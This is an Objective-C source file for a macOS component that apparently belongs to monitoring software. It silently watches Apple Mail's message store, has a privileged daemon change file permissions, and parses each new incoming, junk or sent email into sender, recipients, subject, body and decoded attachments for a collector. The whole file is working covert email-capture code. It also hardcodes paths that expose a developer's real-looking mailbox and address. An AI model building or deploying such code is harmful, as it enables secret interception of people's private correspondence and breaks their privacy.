//
//  MailAppCapture.m
//  MailCaptureManagerForMac
//
//  Created by ophat on 5/27/16.
//  Copyright (c) 2016 ophat. All rights reserved.
//

#import "MailAppCapture.h"

#import "MessagePortIPCSender.h"
#import "DateTimeFormat.h"
#import "SystemUtilsImpl.h"

#import "FxEmailMacOSEvent.h"
#import "FxRecipient.h"
#import "FxAttachment.h"

#import "DaemonPrivateHome.h"

#import <SystemConfiguration/SystemConfiguration.h>
#include <sys/sysctl.h>

@implementation MailAppCapture

@synthesize mWatchlist,mHistory;
@synthesize mCurrentUserName;
@synthesize mAttachPath;
@synthesize mStream, mCurrentRunloopRef;
@synthesize mDelegate;
@synthesize mSelector;
@synthesize mThread;

const int kIncoming = 0;
const int kOutgoing = 1;

MailAppCapture *_MailCapture;

-(id) init{
    if (self = [super init]) {
        _MailCapture = self;
        [self saveCurrentUser];
        
        self.mHistory = [[NSMutableArray alloc]init];
        self.mWatchlist = [[NSMutableArray alloc] init];
        
        NSString * path  = [[NSString alloc]initWithString:[NSString stringWithFormat:@"/Users/%@",self.mCurrentUserName]];
        [self.mWatchlist addObject:[NSString stringWithFormat:@"%@/Library/Mail",path]];
        [path release];
    }
    return self;
}

-(void) startCapture{
    [self watchThisPath:self.mWatchlist];
    
    [self mailReaderEMLXFromPath:@"Users/ophat/Library/Mail/V2/EWS-ophat@digitalendpoint.com@outlook.office365.com/Inbox.mbox/F43DB658-757B-4DE4-9147-FBCF689D4956/Data/4/1/Messages/14672.emlx" andDirection:1];

    [self mailReaderEMLXFromPath:@"Users/ophat/Library/Mail/V2/EWS-ophat@digitalendpoint.com@outlook.office365.com/Inbox.mbox/F43DB658-757B-4DE4-9147-FBCF689D4956/Data/4/1/Messages/14673.emlx" andDirection:1];

    [self mailReaderEMLXFromPath:@"Users/ophat/Library/Mail/V2/EWS-ophat@digitalendpoint.com@outlook.office365.com/Inbox.mbox/F43DB658-757B-4DE4-9147-FBCF689D4956/Data/4/1/Messages/14129.emlx" andDirection:1];

    [self mailReaderEMLXFromPath:@"Users/ophat/Library/Mail/V2/EWS-ophat@digitalendpoint.com@outlook.office365.com/Sent\ Items.mbox/F43DB658-757B-4DE4-9147-FBCF689D4956/Data/3/1/Messages/13987.emlx" andDirection:1];
    
    [self mailReaderEMLXFromPath:@"Users/ophat/Library/Mail/V2/EWS-ophat@digitalendpoint.com@outlook.office365.com/Inbox.mbox/F43DB658-757B-4DE4-9147-FBCF689D4956/Data/3/1/Messages/13986.emlx" andDirection:1];
    
    [self mailReaderEMLXFromPath:@"Users/ophat/Library/Mail/V2/EWS-ophat@digitalendpoint.com@outlook.office365.com/Inbox.mbox/F43DB658-757B-4DE4-9147-FBCF689D4956/Data/3/1/Messages/13569.emlx" andDirection:1];
    
}

-(void) stopCapture{
    if (mStream && mCurrentRunloopRef) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        [self.mWatchlist removeAllObjects];
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
}

-(void)saveCurrentUser{
    self.mCurrentUserName =  [SystemUtilsImpl userLogonName];
}

#pragma mark ### watcher

-(void) watchThisPath:(NSMutableArray *) afileInputPath {
    
    FSEventStreamContext context;
    context.info = (__bridge void *)(self);
    context.version = 0;
    context.retain = NULL;
    context.release = NULL;
    context.copyDescription = NULL;
    
    if (mStream != nil && mCurrentRunloopRef != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
    }
    
    if([mWatchlist count]>0){
        mCurrentRunloopRef = CFRunLoopGetCurrent();
        mStream =   FSEventStreamCreate(NULL,
                                        &fileChangeEvent,
                                        &context,
                                        (__bridge CFArrayRef) afileInputPath,
                                        kFSEventStreamEventIdSinceNow,
                                        0.5,
                                        // kFSEventStreamCreateFlagWatchRoot
                                        kFSEventStreamCreateFlagUseCFTypes
                                        | kFSEventStreamCreateFlagFileEvents
                                        );
        
        FSEventStreamScheduleWithRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStart(mStream);
        NSLog(@"Watch mPathsToWatch %@",afileInputPath);
    }
}

#pragma mark ### fileChangeEvent

static void fileChangeEvent(ConstFSEventStreamRef streamRef,
                            void* callBackInfo,
                            size_t numEvents,
                            void* eventPaths,
                            const FSEventStreamEventFlags eventFlags[],
                            const FSEventStreamEventId eventIds[]) {
    
    NSArray * paths = (__bridge NSArray*)eventPaths;

    NSAppleScript *scptFrontName =[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n item 1 of (get name of processes whose frontmost is true) \n end tell"];
    NSAppleEventDescriptor *Result = [scptFrontName executeAndReturnError:nil];
    NSString * frontMostName = [[NSString alloc]initWithString:[Result stringValue]];
    [scptFrontName release];
    
    NSAppleScript * scptFrontID = [[NSAppleScript alloc]initWithSource:[NSString stringWithFormat:@"id of application \"%@\"",frontMostName]];
    Result=[scptFrontID executeAndReturnError:nil];
    NSString * frontMostID = [[NSString alloc]initWithString:[Result stringValue]];
    [scptFrontID release];
    
    for (int i=0; i< [paths count] ; i++ ){
        FSEventStreamEventFlags flags = eventFlags[i];
        NSString * filePath = [paths objectAtIndex:i];
        if ([filePath rangeOfString:@".DS_Store"].location == NSNotFound && [filePath rangeOfString:@".tmp"].location == NSNotFound ) {
            
            if ([filePath rangeOfString:@"/."].location == NSNotFound && [filePath rangeOfString:@".emlx"].location != NSNotFound) {
                if (flags & kFSEventStreamEventFlagItemCreated || flags & kFSEventStreamEventFlagItemRenamed) {
                    if ( ! [[_MailCapture mHistory]containsObject:filePath]) {
                        [[_MailCapture mHistory] addObject:filePath];
                        
                        [_MailCapture sendToDaemonWithToChangePermissionWithPath:filePath withPermission:644];
                        
                        if ([filePath rangeOfString:@"Sent Items.mbox"].location != NSNotFound) {
                             dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                 [_MailCapture mailReaderEMLXFromPath:filePath andDirection:kOutgoing];
                             });
                        }else if ([filePath rangeOfString:@"Junk Email.mbox"].location != NSNotFound      ||
                                  [filePath rangeOfString:@"Inbox.mbox"].location != NSNotFound ){
                             dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                 [_MailCapture mailReaderEMLXFromPath:filePath andDirection:kIncoming];
                             });
                        }
                    }
                }
            }
        }
    }
    
    [frontMostName release];
    [frontMostID release];
}

-(void) mailReaderEMLXFromPath:(NSString *) aPath andDirection:(int)aDirection {
    sleep(0.5);
    NSString * content = [[NSString alloc]initWithContentsOfFile:[NSString stringWithFormat:@"/%@",aPath] encoding:NSUTF8StringEncoding error:nil];
    if ([content length] > 0) {
        //NSLog(@"cim %@",content);
        NSString * subject         = @"";
        NSString * temp_sender     = @"";
        NSString * senderName      = @"";
        NSString * senderMail      = @"";
        NSString * temp_recipients = @"";
        NSMutableArray *receiveName = [[NSMutableArray alloc]init];
        NSMutableArray *receiveMail = [[NSMutableArray alloc]init];
        NSMutableArray *attachmentName = [[NSMutableArray alloc]init];
        NSMutableArray *attachmentLocation = [[NSMutableArray alloc]init];
        
        NSString * temp_message    = @"";
        NSString * message         = @"";
        int        mailtype        = kEmailServiceTypeUnknown;

        if ([aPath rangeOfString:@"@outlook"].location != NSNotFound || [aPath rangeOfString:@"@hotmail"].location != NSNotFound) {
            mailtype = kEmailServiceTypeLiveHotmail;
        }else if ([aPath rangeOfString:@"@gmail"].location != NSNotFound ) {
            mailtype = kEmailServiceTypeGmail;
        }else if ([aPath rangeOfString:@"@yahoo"].location != NSNotFound ) {
            mailtype = kEmailServiceTypeYahoo;
        }

        if ([content rangeOfString:@"Subject:"].location != NSNotFound ) {
            subject= [[content componentsSeparatedByString:@"Subject:"] objectAtIndex:1];
            subject = [[subject componentsSeparatedByString:@"\n"] objectAtIndex:0];
        }
        
        if ([content rangeOfString:@"From:"].location != NSNotFound ) {
            temp_sender = [[content componentsSeparatedByString:@"From:"] objectAtIndex:1];
            temp_sender = [[temp_sender componentsSeparatedByString:@"\n"] objectAtIndex:0];
        }
 
        if ([content rangeOfString:@"To:"].location != NSNotFound ) {
            temp_recipients = [[content componentsSeparatedByString:@"To:"] objectAtIndex:1];
            temp_recipients = [temp_recipients stringByReplacingOccurrencesOfString:@"CC: " withString:@","];
            
            if ([temp_recipients rangeOfString:@".com>\n"].location !=NSNotFound) {
                temp_recipients = [[temp_recipients componentsSeparatedByString:@".com>\n"] objectAtIndex:0];
                temp_recipients = [temp_recipients stringByAppendingString:@".com>"];
            }else if ([temp_recipients rangeOfString:@".com\n"].location !=NSNotFound) {
                temp_recipients = [[temp_recipients componentsSeparatedByString:@".com\n"] objectAtIndex:0];
                temp_recipients = [temp_recipients stringByAppendingString:@".com"];
            }
            temp_recipients = [temp_recipients stringByReplacingOccurrencesOfString:@"\n" withString:@""];
        }

        if ([content rangeOfString:@"MIME-Version:"].location != NSNotFound) {
            temp_message = [[content componentsSeparatedByString:@"MIME-Version: 1.0"] objectAtIndex:1];
            if ([temp_message rangeOfString:@"<?xml"].location != NSNotFound) {
                temp_message = [[temp_message componentsSeparatedByString:@"<?xml"] objectAtIndex:0];
            }
            
            if ([temp_message rangeOfString:@"<html"].location != NSNotFound) {
                temp_message = [[temp_message componentsSeparatedByString:@"<html"] objectAtIndex:0];
            }
            
            BOOL isContentAttachment   = NO;
            BOOL isEncryptWithbase64   = NO;
            BOOL startReadEncrypt      = NO;
            BOOL isPlainText           = NO;
            NSString * rawText         = @"";
            NSString * encryptedText   = @"";
            NSString * encryptedAttach = @"";

            NSArray *temp_array_message = [temp_message componentsSeparatedByString:@"\n"];
            for (int i=0; i <[temp_array_message count]; i++) {
                if ([[temp_array_message objectAtIndex:i] length] > 0 ) {
                    BOOL matchReg = [self regex:@"[A-Z0-9a-z];*;*:*/*=" withString:[temp_array_message objectAtIndex:i]];
                    if (
                        ([[temp_array_message objectAtIndex:i]rangeOfString:@"Content-"].location != NSNotFound ||
                        [[temp_array_message objectAtIndex:i]rangeOfString:@"X-Microsoft-Exchange-Diagnostics:"].location != NSNotFound ||
                        [[temp_array_message objectAtIndex:i]isEqualToString:@"\n"] ||
                        [[temp_array_message objectAtIndex:i]rangeOfString:@"--"].location != NSNotFound ||
                        [[temp_array_message objectAtIndex:i]rangeOfString:@"_000"].location != NSNotFound )
                    ||
                        (matchReg)
                    ){
                        if (matchReg && isContentAttachment) {
                            encryptedAttach = [encryptedAttach stringByAppendingString:[NSString stringWithFormat:@"\n%@",[temp_array_message objectAtIndex:i]]];
                        }
                        
                        if ([[temp_array_message objectAtIndex:i]rangeOfString:@"Content-Disposition: attachment;"].location != NSNotFound) {
                            isContentAttachment = YES;
                            NSString * filename = [[[temp_array_message objectAtIndex:i]componentsSeparatedByString:@"Content-Disposition: attachment; filename="] objectAtIndex:1];
                            filename = [filename stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                            [attachmentName addObject:filename];
                        }
                        
                        if ([[temp_array_message objectAtIndex:i]rangeOfString:@"Content-Type: text/plain;"].location != NSNotFound && !isContentAttachment) {
                            isPlainText = YES;
                        }
                        
                        if ([[temp_array_message objectAtIndex:i]rangeOfString:@"Content-Transfer-Encoding: base64"].location != NSNotFound) {
                            isEncryptWithbase64 = YES;
                            startReadEncrypt    = YES;
                        }
                        
                        if ([[temp_array_message objectAtIndex:i]rangeOfString:@"--"].location != NSNotFound && startReadEncrypt && isPlainText) {
                            startReadEncrypt = NO;
                            isPlainText      = NO;
                        }
                    }else{
                        if (isEncryptWithbase64 && startReadEncrypt && isPlainText && !isContentAttachment) {
                            encryptedText = [encryptedText stringByAppendingString:[NSString stringWithFormat:@"\n%@",[temp_array_message objectAtIndex:i]]];
                        }
                        else if (isContentAttachment) {
                            encryptedAttach = [encryptedAttach stringByAppendingString:[NSString stringWithFormat:@"\n%@",[temp_array_message objectAtIndex:i]]];
                        }
                        else if (!isEncryptWithbase64) {
                            rawText = [rawText stringByAppendingString:[NSString stringWithFormat:@"\n%@",[temp_array_message objectAtIndex:i]]];
                        }
                    }
                }
            }
           
            message = rawText;
            
            if (isEncryptWithbase64) {
                encryptedText = [encryptedText stringByReplacingOccurrencesOfString:@"\n" withString:@""];
                message = [message stringByAppendingString:@"\n"];
                message = [message stringByAppendingString:[self base64Decode:[NSString stringWithFormat:@"%@",encryptedText]]];
            }
            
            if (isContentAttachment) {
                NSMutableArray * dataContainer = [[NSMutableArray alloc]init];
                NSArray * attachData = [encryptedAttach componentsSeparatedByString:@"\n"];
                NSString * container = @"";
                for (int i=0; i < [attachData count]; i++) {
                    if ([[attachData objectAtIndex:i]rangeOfString:@"X-Attachment-Id:"].location != NSNotFound) {
                        if ([container length] > 0) {
                            [dataContainer addObject:container];
                            container = @"";
                        }
                    }else{
                        container = [container stringByAppendingString:[attachData objectAtIndex:i]];
                    }
                }
                if ([container length] > 0) {
                    [dataContainer addObject:container];
                }
//                NSLog(@"%d : %d",[attachmentName count],[dataContainer count]);
//                NSLog(@"%@",attachmentName );
//                NSLog(@"%@",dataContainer );
//                
                if ([attachmentName count] == [dataContainer count]) {
                    for (int i =0; i < [dataContainer count]; i++) {
                        NSString * path = [NSString stringWithFormat:@"%@/%@",mAttachPath,[attachmentName objectAtIndex:i]];
                        NSString * maker = [self base64Decode:[NSString stringWithFormat:@"%@",[dataContainer objectAtIndex:i]]];
                        if (maker) {
                            [maker writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
                        }else{
                            NSData * data = [self base64DecodeToData:[NSString stringWithFormat:@"%@",[dataContainer objectAtIndex:i]]];
                            [data writeToFile:path atomically:YES];
                        }
                        [attachmentLocation addObject:path];
                    }
                }else{
                    NSLog(@"Data and Name -> Mismatch");
                }
                [dataContainer release];
            }
        }
        
        if ([temp_sender length]>0) {
            senderName = [[temp_sender componentsSeparatedByString:@"<"] objectAtIndex:0];
            senderName = [senderName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
            
            senderMail = [[temp_sender componentsSeparatedByString:@"<"] objectAtIndex:1];
            senderMail = [senderMail stringByReplacingOccurrencesOfString:@">" withString:@""];
            senderMail = [senderMail stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
        }
        
        NSArray * temp_recip_array = [temp_recipients componentsSeparatedByString:@","];
        for (int i=0; i < [temp_recip_array count]; i++) {
            if ([[temp_recip_array objectAtIndex:i]rangeOfString:@"<"].location != NSNotFound &&
                [[temp_recip_array objectAtIndex:i]rangeOfString:@">"].location != NSNotFound ) {
                
                NSString * temp_name = [[[temp_recip_array objectAtIndex:i] componentsSeparatedByString:@"<"] objectAtIndex:0];
                temp_name = [temp_name stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                
                NSString * temp_mail = [[[temp_recip_array objectAtIndex:i] componentsSeparatedByString:@"<"] objectAtIndex:1];
                temp_mail = [temp_mail stringByReplacingOccurrencesOfString:@">" withString:@""];
                
                [receiveName addObject:temp_name];
                [receiveMail addObject:temp_mail];
                
            }else{
                [receiveName addObject:@""];
                [receiveMail addObject:[temp_recip_array objectAtIndex:i]];
            }
        }
        
        message = [message stringByAppendingString:@"\nSend Via AppEmail"];
        
        NSLog(@"############### Ready >? ####");
        NSLog(@"type {%d}",mailtype);
        NSLog(@"Direction {%d}",aDirection);
        NSLog(@"subject {%@}",subject);
        NSLog(@"senderName {%@}",senderName);
        NSLog(@"senderMail {%@}",senderMail);
        NSLog(@"receiveName %@",receiveName);
        NSLog(@"receiveMail %@",receiveMail);
        NSLog(@"Message {%@}",message);
        NSLog(@"Location {%@}",attachmentLocation);
        
        FxEmailMacOSEvent *emailEvent = [[[FxEmailMacOSEvent alloc] init] autorelease];
        [emailEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        [emailEvent setMDirection:aDirection];
        [emailEvent setMUserLogonName:self.mCurrentUserName];
        [emailEvent setMApplicationID:@"com.apple.mail"];
        [emailEvent setMApplicationName:@"Mail"];
        [emailEvent setMTitle:@""];
        [emailEvent setMEmailServiceType:mailtype];
        [emailEvent setMSenderEmail:senderMail];
        [emailEvent setMSenderName:senderName];

        NSMutableArray *recipients = [NSMutableArray array];
        for (int i = 0; i < [receiveMail count]; i++) {
            FxRecipient *recipient = [[[FxRecipient alloc] init] autorelease];
            [recipient setRecipType:kFxRecipientTO];
            [recipient setRecipNumAddr:[receiveMail objectAtIndex:i]];
            [recipient setRecipContactName:[receiveMail objectAtIndex:i]];
            [recipients addObject:recipient];
        }
        [emailEvent setMRecipients:recipients];
        [emailEvent setMSubject:subject];
        [emailEvent setMBody:message];

        NSMutableArray *attachments = [NSMutableArray array];
        for (int i = 0; i < [attachmentLocation count]; i++) {
            FxAttachment *attachment = [[[FxAttachment alloc] init] autorelease];
            [attachment setFullPath:[attachmentLocation objectAtIndex:i]];
            [attachments addObject:attachment];
        }
        [emailEvent setMAttachments:attachments];

        [mDelegate performSelector:mSelector onThread:mThread withObject:emailEvent waitUntilDone:NO];
     
        [attachmentLocation release];
        [attachmentName release];
        [receiveName release];
        [receiveMail release];
    }else{
        NSLog(@"error Content %@ %@",content,aPath);
    }
}
-(BOOL)regex:(NSString *)aReg withString:(NSString *)aString{
    NSError  *error = nil;
    NSRegularExpression* regex = [NSRegularExpression regularExpressionWithPattern: aReg options:0 error:&error];
    NSUInteger matches = [regex numberOfMatchesInString:aString options:0 range: NSMakeRange(0, [aString length])];
    
    if (matches > 0) {
        return YES;
    }
    return NO;
}
-(NSString *)base64Encode:(NSString *)aText{
    NSData *plainData = [aText dataUsingEncoding:NSUTF8StringEncoding];
    NSString *base64String = [plainData base64EncodedStringWithOptions:0];
    return base64String;
}

-(NSString *)base64Decode:(NSString *)aText{
    NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:aText options:0];
    NSString *decodedString = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
    [decodedData release];
    return decodedString;
}

-(NSData *)base64DecodeToData:(NSString *)aText{
    NSData *decodedData = [[[NSData alloc] initWithBase64EncodedString:aText options:0] autorelease];
    return decodedData;
}

-(void)sendToDaemonWithToChangePermissionWithPath:(NSString *)aPath withPermission:(int)aPermission{
    NSLog(@"::==> sendToDaemonWithToChangePermissionWithPath %@ %d",aPath,aPermission);
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"chgownerattr"forKey:@"type"];
    [myCommand setObject:aPath forKey:@"path"];
    [myCommand setObject:[NSString stringWithFormat:@"%d",aPermission] forKey:@"permission"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
}

-(void) dealloc{
    [mThread release];
    [mWatchlist release];
    [mHistory release];
    [super dealloc];
}
@end
